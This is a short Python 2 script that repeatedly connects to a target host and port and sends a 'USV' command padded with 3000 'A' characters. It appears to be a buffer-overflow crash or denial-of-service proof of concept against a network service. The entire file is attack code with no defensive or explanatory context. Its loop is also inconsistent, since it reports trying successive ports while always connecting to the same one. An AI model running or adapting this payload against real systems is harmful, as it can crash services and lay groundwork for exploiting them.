#!/usr/bin/python

import sys, socket

host = sys.argv[1]
port = int(sys.argv[2])
buffer = "\x41"* 3000
i=0
while i<1024:
	try:
		print "Trying to connect to " + str(sys.argv[1]) + " to port " + str(i)
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(None)
		s.connect((host,port))
		s.send("USV " + buffer + "\r\n\r\n")
		s.close()
		print "Port opened"
		i=i+1
	except KeyboardInterrupt:
		sys.exit()
	except:
		i=i+1
		pass
#End

